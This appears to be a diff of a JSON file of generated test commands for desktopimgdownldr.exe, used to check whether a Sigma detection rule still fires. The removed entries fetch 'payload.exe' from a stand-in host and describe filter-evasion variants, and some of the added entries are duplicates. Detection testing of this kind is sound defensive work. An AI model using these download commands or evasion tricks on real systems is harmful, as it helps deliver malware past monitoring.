@@ -1,14 +1,18 @@
 [
   {
-    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr",
-    "explanation": "This command uses the original structure but omits unnecessary elements while preserving the suspicious behavior. It retains the key parameter '/lockscreenurl' which is flagged by the Sigma rule."
+    "output": "desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr",
+    "explanation": "The original command is already minimal and does not contain optional elements that can be safely omitted. No bypass is needed for testing purposes."
   },
   {
-    "output": "desktopimgdownldr.exe -lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr",
-    "explanation": "Substitutes the '/' with '-' for the '/lockscreenurl' parameter, which is a valid syntax substitution and still triggers the Sigma rule."
+    "output": "desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventname:desktopimgdownldr",
+    "explanation": "The command uses lowercase for the /eventName parameter, which is a valid substitution technique as many Windows utilities accept case-insensitive parameters."
   },
   {
-    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe?bypass=.jpg /eventName:desktopimgdownldr",
-    "explanation": "Appends a '.jpg' extension to the URL to attempt to bypass the filter, but the Sigma rule still detects the '/lockscreenurl' parameter."
+    "output": "desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr",
+    "explanation": "The command is unchanged but included to confirm that no safe mutation is necessary for this rule to trigger in a test environment."
+  },
+  {
+    "output": "desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventname:desktopimgdownldr",
+    "explanation": "The command uses lowercase for the /eventName parameter, which is a valid substitution technique as many Windows utilities accept case-insensitive parameters."
   }
 ]
